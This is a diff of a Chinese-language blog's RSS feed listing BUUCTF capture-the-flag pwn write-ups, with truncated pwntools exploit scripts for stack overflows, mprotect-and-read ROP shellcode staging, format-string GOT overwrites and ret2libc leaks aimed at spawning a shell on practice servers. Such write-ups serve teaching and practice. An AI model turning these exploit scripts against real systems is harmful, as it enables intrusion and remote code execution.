+      <description>not_the_same_3dsctf_2016 本题原本是个简单的栈溢出，因为buu环境问题只能利用其它方法，与get_started_3dsctf_2016解法相同
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * elf = ELF(&amp;#39;./not_the_same_3dsctf_2016&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28777) pop3_ret = 0x0804f420#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参 #ROPgadget --binary get_started --only &amp;#39;pop|ret&amp;#39; | grep pop #为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好. mem_addr = 0x80eb000 #可读可写的内存,但不可执行 mem_size = 0x1000 #通过调试出来的值 mem_proc = 0x7 #可代表可读可写可执行 mprotect_addr = elf.symbols[&amp;#39;mprotect&amp;#39;] read_addr = elf.symbols[&amp;#39;read&amp;#39;] &amp;#39;&amp;#39;&amp;#39;为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.&amp;#39;&amp;#39;&amp;#39; payload = &amp;#39;A&amp;#39; * 45 #填充数据覆盖到ebp payload += p32(mprotect_addr) #栈返回到mprotect()函数执行 payload += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12 #mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7) payload += p32(mem_addr) #mprotect函数参数1 修改的内存地址 payload += p32(mem_size) #mprotect函数参数2 修改的内存大小 payload += p32(mem_proc) #mprotect函数参数3 修改的权限 payload += p32(read_addr) #执行完pop3_ret后弹到read地址 payload += p32(pop3_ret) #执行完read后将返回到pop3_ret指令,又继续使esp+12 #read 的三个参数 read(0,0x080ea000,0x100) payload += p32(0) #read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址 payload += p32(mem_addr) #读取到的内容复制到指向的内存里 payload += p32(0x100) #读取大小 payload += p32(mem_addr) #执行完read后ret esi，这里是返回到我们布置的shellcode执行 sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Ciscn_2019_n_8</title>
+      <link>https://niceseven.github.io/post/2020/02/13/buuctf-pwn-ciscn_2019_n_8/</link>
+      <pubDate>Thu, 13 Feb 2020 11:53:07 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/13/buuctf-pwn-ciscn_2019_n_8/</guid>
+      <description>ciscn_2019_n_8 checksec一下
+32位，防护基本上全开，不要吓到
+拖入ida看一下伪代码
+可以看到满足var[13] = 17也就是数组中的第14个数为17，即执行shell
+通过汇编知道var[]是一个四字节的整数类型数组，在ida中显示的数据类型DWORD与QWORD的区别不是很清楚
+暂时理解DWORD为32位的4字节数组，QWORD理解为64位的4字节数组
+exp
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * context(log_level=&amp;#39;debug&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28862) payload = &amp;#39;a&amp;#39;*4*13 + p32(17) #p32(17)=\x11\x00\x00\x00,16进制小端存储，0x11(16)=17(10) #这里*4是因为4字节的数组每一项要4字节才能填满，*13是把数组前13项填满，第14项用 sh.sendlineafter(&amp;#34;What&amp;#39;s your name?\n&amp;#34;,payload) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn [第五空间2019 决赛]PWN5</title>
+      <link>https://niceseven.github.io/post/2020/02/12/buuctf-pwn-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9Bpwn5/</link>
+      <pubDate>Wed, 12 Feb 2020 19:24:40 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/12/buuctf-pwn-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9Bpwn5/</guid>
+      <description>5th_space_2019_final_pwn5 printf(&amp;amp;buf)，明显格式化字符串漏洞，了解atoi函数
+该题有两种解法
+1、第一个read利用格式化字符串漏洞修改unk_804c044的值，第二个read输入我们修改的值去满足if判断执行system(&#39;/bin/sh&#39;)
+2、第一个read利用格式化字符串漏洞修改atoi_got为system_plt，第二次read输入&amp;rdquo;/bin/sh\x00&amp;quot;，执行system(&#39;/bin/sh&#39;)
+exp1
+#!/usr/bin/env python2 #-*-conding=UTF-8-*- from pwn import * sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,29326) target_addr = 0x0804c044 payload = p32(target_addr) + &amp;#39;%10$n&amp;#39; #target_addr = 4byte 4=0x00000004 sh.recvuntil(&amp;#34;your name:&amp;#34;) sh.sendline(payload) sh.recvuntil(&amp;#34;your passwd:&amp;#34;) sh.sendline(str(0x00000004))#atoi函数将数字 sh.interactive() exp2
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * #context(log_level=&amp;#39;debug&amp;#39;) elf = ELF(&amp;#39;./pwn5&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,29326) atoi_got_addr = elf.got[&amp;#39;atoi&amp;#39;] system_plt_addr = elf.plt[&amp;#39;system&amp;#39;] log.success(&amp;#39;atoi_got_addr =&amp;gt; {}&amp;#39;.format(hex(atoi_got_addr))) log.success(&amp;#39;system_plt_addr =&amp;gt; {}&amp;#39;.format(hex(system_plt_addr))) format_string_offset = 10 payload = fmtstr_payload(format_string_offset,{atoi_got_addr:system_plt_addr}) &amp;#39;&amp;#39;&amp;#39;fmtstr_payload()自动生成格式化字符串漏洞相应的payload这里是将atoi_got_addr修改为system_plt_addr,从而执行system()&amp;#39;&amp;#39;&amp;#39; #print payload sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Get_started_3dsctf_2016</title>
+      <link>https://niceseven.github.io/post/2020/02/11/buuctf-pwn-get_started_3dsctf_2016/</link>
+      <pubDate>Tue, 11 Feb 2020 19:48:00 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/11/buuctf-pwn-get_started_3dsctf_2016/</guid>
+      <description>get_started_3dsctf_2016 通过栈溢出，利用mprotect()函数来修改内存权限，一般是将.bss端修改为可读可写可执行，然后通过read()函数向目标内存写入shellcode，然后getshell
+我们通过vmmap可以看到0x080ea000到0x080ec000是可读可写但是不可执行的，所以用mprotect()将这一段修改成可读可写可执行，然后通过read()传shellcode到此处
+也可以用0x080eb000到0x080ec000
+在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性
+函数原型
+int mprotect(const void *startaddr, size_t len, int prot); startaddr 内存启始地址, len修改内存的长度, prot 内存的权限
+需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址startaddr必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。0x1000=4096
+port = 7 表示可读可写可执行4+2+1=7（r=4，w=2，x=1）
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * elf = ELF(&amp;#39;./get_started&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;, 27557) pop3_ret = 0x0804f460#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参 #ROPgadget --binary get_started --only &amp;#39;pop|ret&amp;#39; | grep pop #为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好. mem_addr = 0x80ea000 #可读可写的内存,但不可执行 mem_size = 0x1000 #通过调试出来的值 mem_proc = 0x7 #可代表可读可写可执行 mprotect_addr = elf.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn [OGeek2019]babyrop</title>
+      <link>https://niceseven.github.io/post/2020/02/08/buuctf-pwn-ogeek2019babyrop/</link>
+      <pubDate>Sat, 08 Feb 2020 20:19:30 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/08/buuctf-pwn-ogeek2019babyrop/</guid>
+      <description>[OGeek2019]babyrop #!/usr/bin/env python #-*-coding=UTF-8-*- from pwn import * sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,25393) #sh = process(&amp;#39;./ogeek2019_babyrop&amp;#39;) #context(log_level=&amp;#39;debug&amp;#39;) elf = ELF(&amp;#39;./ogeek2019_babyrop&amp;#39;) write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#39;write&amp;#39;] main_addr = 0x08048825 log.success(&amp;#39;write_plt =&amp;gt; {}&amp;#39;.format(hex(write_plt))) log.success(&amp;#39;write_got =&amp;gt; {}&amp;#39;.format(hex(write_got))) libc = ELF(&amp;#39;./libc-2.23.so&amp;#39;) libc_system_addr = libc.symbols[&amp;#39;system&amp;#39;] libc_binsh_addr = next(libc.search(&amp;#39;/bin/sh&amp;#39;)) libc_write_addr = libc.symbols[&amp;#39;write&amp;#39;] log.success(&amp;#39;libc_system_addr =&amp;gt; {}&amp;#39;.format(hex(libc_system_addr))) log.success(&amp;#39;libc_binsh_addr =&amp;gt; {}&amp;#39;.format(hex(libc_binsh_addr))) log.success(&amp;#39;libc_write_addr =&amp;gt; {}&amp;#39;.format(hex(libc_write_addr))) bypass_payload = &amp;#39;\x00&amp;#39; + &amp;#39;a&amp;#39;*6 #bypass strncmp()  bypass_payload += &amp;#39;\xff&amp;#39; #a1=&amp;#39;\xff&amp;#39;,char&amp;#39;\xff&amp;#39;=255(ascii),read(0,&amp;amp;buf,a1(255))  sh.sendline(bypass_payload) offset2ebp = 0xe7 leak_payload = &amp;#39;a&amp;#39;*offset2ebp + &amp;#39;aaaa&amp;#39; leak_payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #write(1,&amp;amp;write_got,4);retn2main; sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Ciscn_2019_c_1</title>
+      <link>https://niceseven.github.io/post/2020/02/08/buuctf-pwn-ciscn_2019_c_1/</link>
+      <pubDate>Sat, 08 Feb 2020 15:01:15 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/08/buuctf-pwn-ciscn_2019_c_1/</guid>
+      <description>ciscn_2019_c_1 查看main()，可以使用的功能只有1
+进入encrypt()看看伪代码
+溢出点在gets()，offset = 0x58 + 8 = 88
+思路
+1、通过leak出puts()地址确定libc
+2、计算libc基址、system、/bin/sh地址
+3、getshell
+#!/usr/bin/env python #-*-coding=UTF-8-*- from pwn import * from LibcSearcher import * sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,25695) #sh = process(&amp;#39;./ciscn_2019_c_1&amp;#39;) elf = ELF(&amp;#39;./ciscn_2019_c_1&amp;#39;) # context.log_level = &amp;#39;debug&amp;#39; # start = 0x400B28 start = elf.sym[&amp;#39;main&amp;#39;] rdi_addr = 0x0000000000400c83 #pop rdi; ret #由于是64bit系统，因此函数调用的前六个参数是从寄存器中获取的，获取顺序为： #参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9 #所以这里使用通用gadget来传参数 #使用ROPgadget --binary ciscn_2019_en_2 --only &amp;#34;pop|ret&amp;#34;可以查看该gadget puts_plt = elf.plt[&amp;#39;puts&amp;#39;] gets_got = elf.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Ciscn_2019_n_1</title>
+      <link>https://niceseven.github.io/post/2020/02/07/buuctf-pwn-ciscn_2019_n_1/</link>
+      <pubDate>Fri, 07 Feb 2020 12:57:45 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/07/buuctf-pwn-ciscn_2019_n_1/</guid>
+      <description>ciscn_2019_n_1 checksec检查
+64位程序开启NX
+运行一下看看功能
+等待输入，有个tips：11.28125
+拖入ida分析
+main()函数调用func()函数
+看到gets()未做限制明显栈溢出，if判断成功执行cat flag
+变量v1和v2处在同一个栈上，偏移0x30-0x4
+思路：使用gets()通过v1覆盖v2为11.28125，从而满足if判断执行cat flag
+查看11.28125在程序中的表示为0x41348000
+编写exp
+#！/usr/bin/env python #-*-coding=UTF-8-*- from pwn import * sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,27485) payload = &amp;#39;a&amp;#39;*(0x30-0x4) + p64(0x41348000) #这里不能直接使用p64(11.28125),转换出来与程序中的0X41348000不符，会导致if判断不成功 sh.sendlineafter(&amp;#34;Let&amp;#39;s guess the number.\n&amp;#34;,payload) sh.interactive() </description>
+    </item>
     
     <item>
       <title>XCTF Pwn When_did_you_born</title>
